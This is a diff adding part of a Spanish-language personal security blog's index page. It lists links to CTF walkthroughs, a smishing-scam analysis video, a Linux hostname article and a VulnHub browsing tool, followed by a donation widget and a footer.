+      <td><a href="" title="PROXIMAMENTE"><span class="boton-writeup">WriteUp</span></a></td>
+    </tr>
+    <tr>
+      <td><span class="text-article-table">
+          <b><a class="button" href="https://youtu.be/Nq8atKx1lNw" title="Ver Vídeo" target="_blank"><img src="https://cdn-icons-png.flaticon.com/512/720/720320.png" width="30" height="25"></a>
+          <br><a class="a-article" href="https://youtu.be/Nq8atKx1lNw" target="_blank">Analizando ESTAFA de SMISHING y WEB SPOOFING</a></b></span></td>
+      <td><span class="text-descrip-table"><a class="button" href="https://youtu.be/Nq8atKx1lNw"><img src="https://cdn-icons-png.flaticon.com/512/2821/2821739.png" width="25" height="20"></a>
+          <b>07/01/2023 | Analizo la estafa actual de reembolso de la agencia tributaria, la cual funciona a través de smishing para luego redirigir a una suplantación de la web de hacienda. #Youtube Video.</b></span>
+      </td>
+      <td><a href="" title="PROXIMAMENTE"><span class="boton-video1">Vídeo</span></a></td>
+    </tr>
+    <tr>
+      <td><span class="text-article-table">
+          <b><a class="button" href=""><img src="https://cdn-icons-png.flaticon.com/512/1770/1770356.png" width="40" height="25"></a>
+          <br><a class="a-article" href="">HostName Linux. Uso y configuración básica.</a></b></span></td>
+      <td><span class="text-descrip-table"><a class="button" href=""><img src="https://cdn-icons-png.flaticon.com/512/2821/2821739.png" width="25" height="20"></a>
+          <b>07/01/2023 | Un nombre de equipo es un nombre único que se le otorga a un dispositivo conectado a una red de dispositivos informáticos. Puede ser un ordenador, un servidor de ficheros, un dispositivo de almacenamiento conectado en red, un fax, impresora, teléfono móvil, etc..</b></span>
+      </td>
+      <td><a href="" title="PROXIMAMENTE"><span class="boton-linux1">Linux</span></a></td>
+    </tr>
+    <tr>
+      <td><span class="text-article-table">
+          <b><a class="button" href="https://shelldredd.github.io/seguridad/hackmyvm.html"><img src="https://cdn-icons-png.flaticon.com/512/1770/1770356.png" width="40" height="25"></a>
+          <br><a class="a-article" href="https://shelldredd.github.io/seguridad/hackmyvm.html">¿Qué es HackMyVm?</a></b></span></td>
+      <td><span class="text-descrip-table"><a class="button" href="https://shelldredd.github.io/seguridad/hackmyvm.html"><img src="https://cdn-icons-png.flaticon.com/512/2821/2821739.png" width="25" height="20"></a>
+          <b>07/01/2023 | Plataforma de seguridad informática que permite descargar máquinas vulnerables CTF para practicar tus habilidades y aprender conceptos nuevos.</b></span>
+      </td>
+      <td><a href="" title="PROXIMAMENTE"><span class="boton-seguridad">Seguridad</span></a></td>
+    </tr>
+    <tr>
+      <td><span class="text-article-table">
+          <b><a class="button" href="https://youtu.be/Tp9NbSrWTMw" title="Ver Vídeo" target="_blank"><img src="https://cdn-icons-png.flaticon.com/512/4793/4793069.png" width="40" height="30"></a>
+          <br><a class="a-article" href="https://youtu.be/Tp9NbSrWTMw" target="_blank">WriteUp/Walkthrough JABITA VM [HackMyVM]</a></b></span></td>
+      <td><span class="text-descrip-table"><a class="button" href="https://youtu.be/Tp9NbSrWTMw"><img src="https://cdn-icons-png.flaticon.com/512/2821/2821739.png" width="25" height="20"></a>
+          <b>07/01/2023 | Writeup de la máquina vulnerable JABITA creada por Rijaba1 y disponible en la plataforma de CTF HackMyVM.</b></span>
+      </td>
+      <td><a href="" title="PROXIMAMENTE"><span class="boton-video1">Vídeo</span></a></td>
+    </tr>
+    <tr>
+      <td><span class="text-article-table">
+          <b><a class="button" href="https://github.com/ShellDredd/VulnHub-Tool-Explorer" title="Ver Github" target="_blank"><img src="https://cdn-icons-png.flaticon.com/512/8076/8076505.png" width="40" height="30"></a>
+          <br><a class="a-article" href="https://github.com/ShellDredd/VulnHub-Tool-Explorer" target="_blank">VulnHub-Tool-Explorer</a></b></span></td>
+      <td><span class="text-descrip-table"><a class="button" href="https://github.com/ShellDredd/VulnHub-Tool-Explorer"><img src="https://cdn-icons-png.flaticon.com/512/2821/2821739.png" width="25" height="20"></a>
+          <b>Cliente de terminal para explorar y descargar máquinas de la plataforma VulnHub. Programado en Python 3.</b></span>
+      </td>
+      <td><a href="" title="PROXIMAMENTE"><span class="boton-herramientas">Herramienta</span></a></td>
+    </tr>
+    <tr>
+      <td><span class="text-article-table">
+          <b><a class="button" href="https://youtu.be/R3DE1ZHo2s4" title="Ver Directo" target="_blank"><img src="https://media1.giphy.com/media/USaytK56wz2dasZPeC/giphy.gif?cid=ecf05e47850pvkwo9ckksibw1g6lgvfa8k51mymlvwpdvhyx&rid=giphy.gif&ct=s" width="60" height="40"></a>
+            <br><a class="a-article" href="https://youtu.be/R3DE1ZHo2s4" target="_blank">Directo resolviendo 2 máquinas CTF - GIFT | FLOWERS - HackMyVM</a></b></span></td>
+      <td><span class="text-descrip-table"><a class="button" href="https://youtu.be/R3DE1ZHo2s4"><img src="https://cdn-icons-png.flaticon.com/512/2821/2821739.png" width="25" height="20"></a>
+          <b>Resolución y explicación en directo a través de Twitch de dos máquinas CTF, Gift y Flowers, pertenecientes a la plataforma HackMyVM.</b></span>
+      </td>
+      <td><a title="PROXIMAMENTE"><span class="boton-directos">Directo</span></a></td>
+    </tr>
+    <tr>
+      <td><span class="text-article-table">
+          <b><a class="button" href="https://cdn-icons-png.flaticon.com/512/220/220215.png" title="Ver Artículo" target="_blank"><img src="https://cdn-icons-png.flaticon.com/512/220/220215.png" width="30" height="25"></a>
+            <br><a class="a-article" href="https://youtu.be/R3DE1ZHo2s4" target="_blank">Descarga cualquier producto oficial de MICROSOFT en 2 clicks.</a></b></span></td>
+      <td><span class="text-descrip-table"><a class="button" href="https://youtu.be/R3DE1ZHo2s4"><img src="https://cdn-icons-png.flaticon.com/512/2821/2821739.png" width="25" height="20"></a>
+          <b>Descubre esta herramienta online para descargar cualquier producto de Microsoft de forma sencilla y rápida desde un menú intuitivo.</b></span>
+      </td>
+      <td><a title="PROXIMAMENTE"><span class="boton-windows1">Windows</span></a></td>
+    </tr>
+  
+</table>
+</div>
+
+
+
+<div class="donat">
+<h2 class="donat-h2">¿Te gusta el contenido de ShellDredd?</h2>
+<span class="donat-span">Si quieres puedes invitarme a un café para apoyar el contenido.</span>
+<script type='text/javascript' src='https://storage.ko-fi.com/cdn/widget/Widget_2.js'></script><script class="donat" type='text/javascript'>kofiwidget2.init('Support Me on Ko-fi', '#b53ff5', 'S6S5BGJG8');kofiwidget2.draw();</script> 
+</div><br><br>
+
+         <!-- Footer -->
+         <footer class="footer">
+            <p class="text-footer">Shelldredd© 2022-2023<img class="logo-footer" src="images/shell-logo1.png"></p>
+          </footer>
+          </main>
+          </body>
+
+    </html>
+        
